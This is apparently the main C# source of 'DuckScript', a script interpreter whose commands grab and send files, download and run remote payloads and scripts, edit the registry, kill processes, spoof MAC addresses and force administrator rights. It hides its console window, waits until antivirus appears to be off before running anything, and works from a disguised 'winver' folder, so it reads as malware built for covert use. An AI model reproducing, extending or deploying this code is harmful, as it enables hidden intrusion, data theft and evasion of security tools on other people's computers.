#region using
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
#endregion

namespace DuckScript
{
    class Program
    {
        #region Variables
        [DllImport("user32.dll")]
        public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("user32.dll")]
        internal static extern IntPtr SetForegroundWindow(IntPtr hWnd);
        [DllImport("user32.dll", SetLastError = true)]
        internal static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);
        [DllImport("user32.dll")]
        public static extern int GetWindowRect(IntPtr hwnd, out Rectangle rect);

        public static string loc = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        public static WebClient wc = new WebClient();
        public static bool payloadsRequested = false;
        public static bool payloadDownloaded = false;
        public static List<string> payloadarg1List = new List<string>();
        public static List<string> payloadarg2List = new List<string>();
        public static List<string> payloadarg3List = new List<string>();
        public static List<string> payloadarg4List = new List<string>();
        public static List<string> payloadarg5List = new List<string>();
        #endregion

        #region Startup
        public static bool isAdmin = false;
        public static string scriptfile = "";
        public static void Main(string[] args)
        {
            if (Global.IsAdministrator())
            {
                isAdmin = true;
                Console.Title = "DuckScript " + Settings.version + " [Administrator]";
            }
            else
            {
                Console.Title = "DuckScript " + Settings.version;
            }

            bool nosettingsupdate = false;
            string payloads = "";
            try { payloads = File.ReadAllText(args[0].Replace("*", " ")); scriptfile = args[0].Replace("*", " "); }
            catch
            {
                try
                {
                    Global.AddFileExtension();
                }
                catch (UnauthorizedAccessException)
                {
                    string[] keys = Registry.ClassesRoot.GetSubKeyNames();
                    bool installed = false;
                    foreach (var key in keys)
                    {
                        if (key == ".duck")
                        {
                            installed = true;
                        }
                    }
                    if (installed == false)
                    {
                        Global.CallError(".duck extension not installed!\nRun as Administrator to install!");
                    }
                }
                catch (Exception ex)
                {
                    Global.CallError(ex.ToString());
                }

                try
                {
                    if (args[1].ToLower() == "/nosettingsupdate")
                        nosettingsupdate = true;
                }
                catch { }
                redo:
                Settings.debug = "true";
                Console.Write("Script path: ");
                string path = Console.ReadLine().Replace("\"", "");
                if (File.Exists(path))
                {
                    if (path.ToLower().Contains(".duck"))
                    {
                        payloads = File.ReadAllText(path);
                        scriptfile = path;
                    }
                    else
                    {
                        Console.WriteLine("File is not a duck script!");
                    }
                }
                else
                {
                    Console.WriteLine("File not existing!");
                    goto redo;
                }
            }

            

            var handle = GetConsoleWindow();
            if (Settings.debug != "true")
                ShowWindow(handle, 0);

            int attempts = 0;
            retry:
            try
            {
                attempts++;
                int attempts2 = 0;
                reCheck:
                attempts2++;
                if (Global.IsAntiVirusOff())
                {
                    executePayloads(payloads, nosettingsupdate);
                }
                else
                {
                    Thread.Sleep(1000);
                    if (attempts2 < 60) { goto reCheck; }
                }
                Environment.Exit(69);
            }
            catch
            {
                if (attempts > 5)
                {
                    Environment.Exit(420);
                }
                goto retry;
            }
        }
        #endregion

        #region ScriptReader
        public static void Wc_DownloadFileCompleted(object sender, System.ComponentModel.AsyncCompletedEventArgs e)
        {
            Program.payloadDownloaded = true;
        }
        public static void executePayloads(string payloads, bool nosettingsupdate)
        {
            wc.DownloadFileCompleted += Wc_DownloadFileCompleted;
            string panelData = payloads;
            if (panelData == "")
            {
                panelData = File.ReadAllText(payloads);
            }
            
            string[] allPayloads = panelData.Split('\n');
            int nr = -1;
            foreach (var payload in allPayloads)
            {
                nr++;
                
                if (!payload.StartsWith("#"))
                {
                    try
                    {
                        string payloadarg1 = "";
                        string payloadarg2 = "";
                        string payloadarg3 = "";
                        string payloadarg4 = "";
                        string payloadarg5 = "";
                        try
                        {
                            payloadarg1 = payload.Split('"')[1];
                            payloadarg1 = Global.FixString(payloadarg1);
                        }
                        catch { }

                        try
                        {
                            payloadarg2 = payload.Split('"')[3];
                            payloadarg2 = Global.FixString(payloadarg2);
                        }
                        catch { }

                        try
                        {
                            payloadarg3 = payload.Split('"')[5];
                            payloadarg3 = Global.FixString(payloadarg3);
                        }
                        catch { }

                        try
                        {
                            payloadarg4 = payload.Split('"')[7];
                            payloadarg4 = Global.FixString(payloadarg4);
                        }
                        catch { }

                        try
                        {
                            payloadarg5 = payload.Split('"')[9];
                            payloadarg5 = Global.FixString(payloadarg5);
                        }
                        catch { }

                        payloadarg1List.Add(payloadarg1);
                        payloadarg2List.Add(payloadarg2);
                        payloadarg3List.Add(payloadarg3);
                        payloadarg4List.Add(payloadarg4);
                        payloadarg5List.Add(payloadarg5);
                        if (payloadarg1.ToLower() == "/updatesettings" || payloadarg1.ToLower() == "/updatesetting")
                        {
                            if (!nosettingsupdate)
                                Commands.UpdateSettings(payloadarg2, payloadarg3);
                        }
                        else if (payloadarg1.ToLower() == "/start" || payloadarg1.ToLower() == "/open")
                        {
                            ProcessStartInfo startInfo = new ProcessStartInfo();
                            startInfo.FileName = payloadarg2;
                            if (payloadarg3 != "") { startInfo.Arguments = payloadarg3; }
                            startInfo.UseShellExecute = false;
                            startInfo.RedirectStandardOutput = true;
                            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                            Process.Start(startInfo);
                        }
                        else if (payloadarg1.ToLower() == "/kill" || payloadarg1.ToLower() == "/end")
                        {
                            Process[] processRunning = Process.GetProcesses();
                            foreach (Process pr in processRunning)
                            {
                                if (pr.ProcessName.ToLower().Contains(payloadarg2))
                                {
                                    pr.Kill();
                                }
                            }
                        }
                        else if (payloadarg1.ToLower() == "/sleep" || payloadarg1.ToLower() == "/wait")
                        {
                            Thread.Sleep(Convert.ToInt32(payloadarg2));
                        }
                        else if (payloadarg1.ToLower() == "/deletefile" || payloadarg1.ToLower() == "/removefile")
                        {
                            if (File.Exists(payloadarg2))
                            {
                                File.Delete(payloadarg2);
                            }
                        }
                        else if (payloadarg1.ToLower() == "/getfile" || payloadarg1.ToLower() == "/grabfile")
                        {
                            Commands.SendFile(payloadarg2);
                        }
                        else if (payloadarg1.ToLower() == "/modifyfile" || payloadarg1.ToLower() == "/editfile")
                        {
                            Commands.ModifyFile(payloadarg2, payloadarg3);
                        }
                        else if (payloadarg1.ToLower() == "/setregkey" || payloadarg1.ToLower() == "/editregkey")
                        {
                            Commands.SetRegKey(payloadarg2, payloadarg3, payloadarg4, payloadarg5);
                        }
                        else if (payloadarg1.ToLower() == "/delregkey" || payloadarg1.ToLower() == "/removeregkey")
                        {
                            Commands.DelRegKey(payloadarg2, payloadarg3, payloadarg4);
                        }
                        else if (payloadarg1.ToLower() == "/shownote" || payloadarg1.ToLower() == "/note")
                        {
                            Commands.ShowNote(payloadarg2, payloadarg3);
                        }
                        else if (payloadarg1.ToLower() == "/showmessage" || payloadarg1.ToLower() == "/msg")
                        {
                            new Thread(() => Commands.ShowMessage(payloadarg2, payloadarg3)).Start();
                        }
                        else if (payloadarg1.ToLower() == "/downloadfile" || payloadarg1.ToLower() == "/downloadpayload")
                        {
                            Commands.RunPayload(payloadarg2, payloadarg3, payloadarg4);
                        }
                        else if (payloadarg1.ToLower() == "/runscript" || payloadarg1.ToLower() == "/runonlinescript")
                        {
                            Commands.RunOnlineScript(payloadarg2, payloadarg3);
                        }
                        else if (payloadarg1.ToLower() == "/focuswindow" || payloadarg1.ToLower() == "/focus")
                        {
                            Commands.FocusWindow(payloadarg2);
                        }
                        else if (payloadarg1.ToLower() == "/setwindowstate" || payloadarg1.ToLower() == "/setwindow")
                        {
                            Commands.SetWindowState(payloadarg2, payloadarg3, payloadarg4, payloadarg5);
                        }
                        else if (payloadarg1.ToLower() == "/sendkey" || payloadarg1.ToLower() == "/sendkeys")
                        {
                            Commands.SendKey(payloadarg2);
                        }
                        else if (payloadarg1.ToLower() == "/playsound" || payloadarg1.ToLower() == "/playaudio")
                        {
                            new Thread(() => Commands.playSound(payloadarg2)).Start();
                        }
                        else if (payloadarg1.ToLower() == "/until" || payloadarg1.ToLower() == "/waituntil")
                        {
                            Commands.Until(payloadarg2, payloadarg3);
                        }
                        else if (payloadarg1.ToLower() == "/spoofmac" || payloadarg1.ToLower() == "/macbypass")
                        {
                            Commands.SpoofMac(payloadarg1);
                        }
                        else if (payloadarg1.ToLower() == "/compile" || payloadarg1.ToLower() == "/compilecsharp")
                        {
                            Commands.Compile(payloadarg2, payloadarg3);
                        }
                        else if (payloadarg1.ToLower() == "/restartasadmin" || payloadarg1.ToLower() == "/forceadmin")
                        {
                            Commands.RestartAsAdmin();
                        }
                        else if (payloadarg1.ToLower() == "/writetofile" || payloadarg1.ToLower() == "/writefile")
                        {
                            Commands.WriteToFile(payloadarg2, payloadarg3);
                        }
                        else if (payloadarg1.ToLower() == "/cleanall" || payloadarg1.ToLower() == "/cleanduck")
                        {
                            DirectoryInfo di = new DirectoryInfo(loc + @"\winver\DuckScript\");
                            foreach (FileInfo file in di.GetFiles())
                            {
                                file.Delete();
                            }
                            foreach (DirectoryInfo dir in di.GetDirectories())
                            {
                                dir.Delete(true);
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        var color = Console.ForegroundColor;
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine(ex.ToString());
                        Console.ForegroundColor = color;
                    }
                }
            }
        }
        #endregion
    }
}